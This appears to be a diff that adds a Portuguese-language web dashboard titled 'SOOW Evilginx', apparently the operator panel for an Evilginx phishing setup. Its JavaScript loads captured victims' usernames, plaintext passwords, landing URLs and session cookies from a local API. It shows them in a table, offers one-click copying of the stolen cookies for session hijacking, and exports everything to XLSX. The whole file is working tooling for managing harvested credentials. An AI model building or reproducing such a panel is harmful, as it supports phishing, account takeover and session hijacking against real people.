@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SOOW Evilginx</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg: #0f1117;
+    --surface: #1a1d27;
+    --surface-hover: #222632;
+    --border: #2a2e3b;
+    --text: #e4e6eb;
+    --text-muted: #8b8fa3;
+    --accent: #6366f1;
+    --accent-hover: #818cf8;
+    --danger: #ef4444;
+    --danger-hover: #f87171;
+    --success: #22c55e;
+    --warning: #f59e0b;
+    --radius: 10px;
+    --radius-sm: 6px;
+  }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    line-height: 1.5;
+  }
+
+  .container { max-width: 1280px; margin: 0 auto; padding: 24px 16px; }
+
+  /* Header */
+  .header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 16px 0;
+    margin-bottom: 24px;
+    border-bottom: 1px solid var(--border);
+  }
+  .header-left { display: flex; align-items: center; gap: 12px; }
+  .header-left h1 {
+    font-size: 1.4rem;
+    font-weight: 700;
+    letter-spacing: -0.02em;
+  }
+  .header-left h1 span { color: var(--accent); }
+  .header-actions { display: flex; gap: 8px; }
+
+  /* Buttons */
+  .btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 8px 16px;
+    border: none;
+    border-radius: var(--radius-sm);
+    font-size: 0.85rem;
+    font-weight: 500;
+    cursor: pointer;
+    transition: all 0.15s;
+    white-space: nowrap;
+  }
+  .btn-primary {
+    background: var(--accent);
+    color: #fff;
+  }
+  .btn-primary:hover { background: var(--accent-hover); }
+  .btn-outline {
+    background: transparent;
+    color: var(--text-muted);
+    border: 1px solid var(--border);
+  }
+  .btn-outline:hover { border-color: var(--text-muted); color: var(--text); }
+  .btn-danger {
+    background: transparent;
+    color: var(--danger);
+    border: 1px solid transparent;
+    padding: 4px 8px;
+  }
+  .btn-danger:hover { background: rgba(239,68,68,0.1); }
+  .btn-copy {
+    background: transparent;
+    color: var(--accent);
+    border: 1px solid var(--border);
+    padding: 4px 10px;
+    font-size: 0.8rem;
+  }
+  .btn-copy:hover { border-color: var(--accent); background: rgba(99,102,241,0.1); }
+  .btn-copy.copied { color: var(--success); border-color: var(--success); }
+  .btn-icon {
+    background: transparent;
+    color: var(--text-muted);
+    border: none;
+    padding: 6px;
+    border-radius: var(--radius-sm);
+  }
+  .btn-icon:hover { color: var(--text); background: var(--surface-hover); }
+
+  /* Search bar */
+  .search-bar {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 20px;
+    flex-wrap: wrap;
+  }
+  .search-bar input {
+    flex: 1;
+    min-width: 180px;
+    padding: 10px 14px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    color: var(--text);
+    font-size: 0.9rem;
+    outline: none;
+    transition: border-color 0.15s;
+  }
+  .search-bar input:focus { border-color: var(--accent); }
+  .search-bar input::placeholder { color: var(--text-muted); }
+  .search-bar .id-input { max-width: 120px; flex: 0; }
+
+  /* Stats bar */
+  .stats {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 12px;
+    font-size: 0.82rem;
+    color: var(--text-muted);
+  }
+  .stats .count span { color: var(--text); font-weight: 600; }
+
+  /* Table */
+  .table-wrap {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+  }
+  table { width: 100%; border-collapse: collapse; }
+  thead th {
+    text-align: left;
+    padding: 12px 16px;
+    font-size: 0.75rem;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    color: var(--text-muted);
+    border-bottom: 1px solid var(--border);
+    background: var(--surface);
+    position: sticky;
+    top: 0;
+  }
+  tbody tr { border-bottom: 1px solid var(--border); transition: background 0.1s; }
+  tbody tr:last-child { border-bottom: none; }
+  tbody tr:hover { background: var(--surface-hover); }
+  tbody td {
+    padding: 10px 16px;
+    font-size: 0.88rem;
+    vertical-align: middle;
+  }
+  .col-id { width: 60px; color: var(--text-muted); font-variant-numeric: tabular-nums; }
+  .col-user { min-width: 200px; }
+  .col-pass { min-width: 140px; }
+  .col-pass code {
+    background: rgba(99,102,241,0.1);
+    padding: 2px 8px;
+    border-radius: 4px;
+    font-family: 'Cascadia Code', 'Fira Code', monospace;
+    font-size: 0.82rem;
+    color: var(--accent-hover);
+  }
+  .col-landing { min-width: 200px; }
+  .col-landing a {
+    color: var(--accent);
+    text-decoration: none;
+    font-size: 0.84rem;
+  }
+  .col-landing a:hover { text-decoration: underline; }
+  .col-actions { width: 200px; white-space: nowrap; }
+  .col-actions .action-group { display: flex; gap: 4px; align-items: center; flex-wrap: wrap; }
+
+  /* Modal */
+  .modal-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.6);
+    backdrop-filter: blur(4px);
+    z-index: 100;
+    align-items: center;
+    justify-content: center;
+  }
+  .modal-overlay.active { display: flex; }
+  .modal {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    width: 90%;
+    max-width: 640px;
+    max-height: 80vh;
+    display: flex;
+    flex-direction: column;
+  }
+  .modal-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 16px 20px;
+    border-bottom: 1px solid var(--border);
+  }
+  .modal-header h3 { font-size: 1rem; font-weight: 600; }
+  .modal-body {
+    padding: 16px 20px;
+    overflow-y: auto;
+    flex: 1;
+  }
+  .modal-body pre {
+    background: var(--bg);
+    padding: 16px;
+    border-radius: var(--radius-sm);
+    font-size: 0.78rem;
+    font-family: 'Cascadia Code', 'Fira Code', monospace;
+    overflow-x: auto;
+    white-space: pre-wrap;
+    word-break: break-all;
+    line-height: 1.6;
+    color: var(--text-muted);
+    max-height: 50vh;
+  }
+  .modal-footer {
+    display: flex;
+    justify-content: flex-end;
+    gap: 8px;
+    padding: 12px 20px;
+    border-top: 1px solid var(--border);
+  }
+
+  /* Toast */
+  .toast {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    padding: 10px 18px;
+    border-radius: var(--radius-sm);
+    font-size: 0.85rem;
+    font-weight: 500;
+    z-index: 200;
+    transform: translateY(80px);
+    opacity: 0;
+    transition: all 0.3s;
+  }
+  .toast.show { transform: translateY(0); opacity: 1; }
+  .toast.success { background: var(--success); color: #000; }
+  .toast.error { background: var(--danger); color: #fff; }
+  .toast.info { background: var(--accent); color: #fff; }
+
+  /* Empty state */
+  .empty {
+    text-align: center;
+    padding: 60px 20px;
+    color: var(--text-muted);
+  }
+  .empty svg { margin-bottom: 12px; opacity: 0.4; }
+  .empty p { font-size: 0.9rem; }
+
+  /* Confirm dialog */
+  .confirm-bar {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    background: rgba(239,68,68,0.08);
+    border: 1px solid rgba(239,68,68,0.2);
+    border-radius: var(--radius-sm);
+    padding: 6px 10px;
+    font-size: 0.8rem;
+    color: var(--danger);
+  }
+  .confirm-bar .btn { font-size: 0.78rem; padding: 3px 10px; }
+
+  /* Loading skeleton */
+  .skeleton {
+    background: linear-gradient(90deg, var(--surface) 25%, var(--surface-hover) 50%, var(--surface) 75%);
+    background-size: 200% 100%;
+    animation: shimmer 1.5s infinite;
+    border-radius: 4px;
+    height: 16px;
+  }
+  @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
+
+  @media (max-width: 768px) {
+    .header { flex-direction: column; gap: 12px; align-items: flex-start; }
+    .search-bar { flex-direction: column; }
+    .search-bar .id-input { max-width: 100%; }
+    .table-wrap { overflow-x: auto; }
+    table { min-width: 700px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="header">
+    <div class="header-left">
+      <h1><span>SOOW</span> Evilginx</h1>
+    </div>
+    <div class="header-actions">
+      <button class="btn btn-outline" onclick="loadUsers()">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 4v6h-6"/><path d="M1 20v-6h6"/><path d="M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15"/></svg>
+        Atualizar
+      </button>
+      <button class="btn btn-outline" onclick="exportXLSX()">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+        Exportar XLSX
+      </button>
+    </div>
+  </div>
+
+  <div class="search-bar">
+    <input type="text" id="searchUser" placeholder="Buscar por username..." onkeydown="if(event.key==='Enter') loadUsers()">
+    <input type="text" id="searchId" class="id-input" placeholder="ID exato" onkeydown="if(event.key==='Enter') loadUsers()">
+    <button class="btn btn-primary" onclick="loadUsers()">Buscar</button>
+  </div>
+
+  <div class="stats">
+    <div class="count" id="statsCount"></div>
+    <div id="statsTime"></div>
+  </div>
+
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr>
+          <th class="col-id">ID</th>
+          <th class="col-user">Username</th>
+          <th class="col-pass">Password</th>
+          <th class="col-landing">Landing</th>
+          <th class="col-actions">Ações</th>
+        </tr>
+      </thead>
+      <tbody id="tbody"></tbody>
+    </table>
+    <div class="empty" id="emptyState" style="display:none;">
+      <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+      <p>Nenhum resultado encontrado</p>
+    </div>
+  </div>
+</div>
+
+<!-- Token Modal -->
+<div class="modal-overlay" id="tokenModal">
+  <div class="modal">
+    <div class="modal-header">
+      <h3 id="modalTitle">Cookies</h3>
+      <button class="btn-icon" onclick="closeModal()">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+      </button>
+    </div>
+    <div class="modal-body">
+      <pre id="modalBody"></pre>
+    </div>
+    <div class="modal-footer">
+      <button class="btn btn-outline" onclick="closeModal()">Fechar</button>
+      <button class="btn btn-primary" onclick="copyModalContent()">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+        Copiar cookies
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Toast -->
+<div class="toast" id="toast"></div>
+
+<script>
+let usersData = [];
+
+async function loadUsers() {
+  const username = document.getElementById('searchUser').value.trim();
+  const id = document.getElementById('searchId').value.trim();
+  const tbody = document.getElementById('tbody');
+  const empty = document.getElementById('emptyState');
+
+  tbody.innerHTML = '<tr>' + '<td colspan="5"><div class="skeleton" style="width:100%;height:36px;margin:8px 0"></div></td>'.repeat(1) + '</tr>'.repeat(3);
+  empty.style.display = 'none';
+
+  let url = '/api/users?limit=200';
+  if (id) url += '&id=' + encodeURIComponent(id);
+  else if (username) url += '&username=' + encodeURIComponent(username);
+
+  try {
+    const resp = await fetch(url);
+    usersData = await resp.json();
+    renderTable();
+  } catch (e) {
+    showToast('Erro ao carregar dados', 'error');
+    tbody.innerHTML = '';
+    empty.style.display = 'block';
+  }
+}
+
+function renderTable() {
+  const tbody = document.getElementById('tbody');
+  const empty = document.getElementById('emptyState');
+  const stats = document.getElementById('statsCount');
+  const time = document.getElementById('statsTime');
+
+  if (!usersData.length) {
+    tbody.innerHTML = '';
+    empty.style.display = 'block';
+    stats.innerHTML = '';
+    return;
+  }
+
+  empty.style.display = 'none';
+  stats.innerHTML = '<span>' + usersData.length + '</span> resultado' + (usersData.length > 1 ? 's' : '');
+  time.textContent = 'Atualizado: ' + new Date().toLocaleString('pt-BR');
+
+  tbody.innerHTML = usersData.map(u => {
+    const hasTokens = u.tokens && ((Array.isArray(u.tokens) && u.tokens.length) || (!Array.isArray(u.tokens) && Object.keys(u.tokens).length));
+    return `<tr id="row-${u.id}">
+      <td class="col-id">${u.id}</td>
+      <td class="col-user">${esc(u.username || '')}</td>
+      <td class="col-pass"><code>${esc(u.password || '')}</code></td>
+      <td class="col-landing">${u.landing_url ? `<a href="${esc(u.landing_url)}" target="_blank">${esc(u.landing_url)}</a>` : '-'}</td>
+      <td class="col-actions">
+        <div class="action-group">
+          ${hasTokens ? `<button class="btn btn-copy" onclick="showTokens(${u.id})">Cookies</button>` : '<span style="color:var(--text-muted);font-size:0.8rem">-</span>'}
+          <button class="btn btn-danger" onclick="confirmDelete(${u.id})" title="Excluir">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2"/></svg>
+          </button>
+        </div>
+      </td>
+    </tr>`;
+  }).join('');
+}
+
+function confirmDelete(id) {
+  const row = document.getElementById('row-' + id);
+  if (!row) return;
+  const cell = row.querySelector('.action-group');
+  if (cell.dataset.confirming) return;
+  cell.dataset.confirming = '1';
+  const saved = cell.innerHTML;
+  cell.innerHTML = `<span style="color:var(--danger);font-size:0.8rem">Excluir?</span>
+    <button class="btn" style="background:var(--danger);color:#fff;padding:3px 10px;font-size:0.78rem" onclick="deleteUser(${id})">Sim</button>
+    <button class="btn btn-outline" style="padding:3px 10px;font-size:0.78rem" onclick="cancelDelete(${id})">N&atilde;o</button>`;
+  window['_saved_' + id] = saved;
+}
+
+function cancelDelete(id) {
+  const row = document.getElementById('row-' + id);
+  if (!row) return;
+  const cell = row.querySelector('.action-group');
+  cell.innerHTML = window['_saved_' + id];
+  delete cell.dataset.confirming;
+}
+
+async function deleteUser(id) {
+  try {
+    const resp = await fetch('/api/users/' + id, { method: 'DELETE' });
+    const data = await resp.json();
+    if (resp.ok) {
+      const row = document.getElementById('row-' + id);
+      if (row) {
+        row.style.transition = 'opacity 0.3s, transform 0.3s';
+        row.style.opacity = '0';
+        row.style.transform = 'translateX(20px)';
+        setTimeout(() => row.remove(), 300);
+      }
+      usersData = usersData.filter(u => u.id !== id);
+      document.getElementById('statsCount').innerHTML = usersData.length
+        ? '<span>' + usersData.length + '</span> resultado' + (usersData.length > 1 ? 's' : '')
+        : '';
+      if (!usersData.length) document.getElementById('emptyState').style.display = 'block';
+      showToast('Credencial removida', 'success');
+    } else {
+      showToast(data.error || 'Erro ao excluir', 'error');
+    }
+  } catch (e) {
+    showToast('Erro de conexão', 'error');
+  }
+}
+
+function showTokens(id) {
+  const user = usersData.find(u => u.id === id);
+  if (!user) return;
+  document.getElementById('modalTitle').textContent = 'Cookies — ' + (user.username || 'ID ' + id);
+  document.getElementById('modalBody').textContent = JSON.stringify(user.tokens, null, 2);
+  document.getElementById('tokenModal').classList.add('active');
+}
+
+function closeModal() {
+  document.getElementById('tokenModal').classList.remove('active');
+}
+
+async function copyModalContent() {
+  const text = document.getElementById('modalBody').textContent;
+  try {
+    await navigator.clipboard.writeText(text);
+    showToast('Cookies copiados!', 'success');
+  } catch {
+    const ta = document.createElement('textarea');
+    ta.value = text;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    ta.remove();
+    showToast('Cookies copiados!', 'success');
+  }
+}
+
+function exportXLSX() {
+  const username = document.getElementById('searchUser').value.trim();
+  const id = document.getElementById('searchId').value.trim();
+  let url = '/api/export_xlsx?';
+  if (id) url += 'id=' + encodeURIComponent(id);
+  else if (username) url += 'username=' + encodeURIComponent(username);
+  window.location.href = url;
+}
+
+function showToast(msg, type) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'toast ' + type + ' show';
+  setTimeout(() => t.classList.remove('show'), 2500);
+}
+
+function esc(s) {
+  const d = document.createElement('div');
+  d.textContent = s;
+  return d.innerHTML;
+}
+
+document.getElementById('tokenModal').addEventListener('click', function(e) {
+  if (e.target === this) closeModal();
+});
+
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'Escape') closeModal();
+});
+
+loadUsers();
+</script>
+</body>
+</html>
